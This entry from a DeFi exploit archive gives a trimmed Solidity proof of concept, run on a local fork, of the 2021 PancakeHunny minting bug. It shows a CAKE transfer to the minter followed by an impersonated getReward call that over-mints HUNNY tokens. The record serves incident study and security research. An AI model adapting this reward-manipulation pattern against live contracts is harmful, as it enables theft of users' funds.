# [?] PancakeHunny - Incorrect calculation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: PancakeHunny
Published: 2021-06-03
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-06/PancakeHunny_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IPancakeRouter pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    address hunnyMinter = 0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300;
    CakeFlipVault cakeVault = CakeFlipVault(0x12180BB36DdBce325b3be0c087d61Fce39b8f5A4);

    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 cake = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    IERC20 hunny = IERC20(0x565b72163f17849832A692A3c5928cc502f46D69);

    constructor() {
        cheat.createSelectFork("bsc", 7_962_338); //fork bsc at block 7962338

        wbnb.approve(address(pancakeRouter), type(uint256).max);
        hunny.approve(address(pancakeRouter), type(uint256).max);
    }

    function testExploit() public {
        wbnb.deposit{value: 5.752 ether}();
        wbnb.transfer(address(this), 5.752 ether);

        //WBNB was swapped to CAKE at PancakeSwap
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(cake);
        pancakeRouter.swapExactETHForTokens{value: 5.752 ether}(0, path, address(this), 1_622_687_689);

        emit log_named_decimal_uint("Swap cake, Cake Balance", cake.balanceOf(address(this)), 18);

        //The attacker sent CAKE to our HUNNY Minter contract
        cake.transfer(hunnyMinter, 59_880_957_483_227_401_400);

        //The attacker staked on CAKE-BNB Hive in PancakeHunny
        cheat.startPrank(0x515Fb5a7032CdD688B292086cf23280bEb9E31B6);
        //HUNNY Minter was “tricked” to mint more HUNNY tokens
        cakeVault.getReward();
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-06/PancakeHunny_exp.sol_
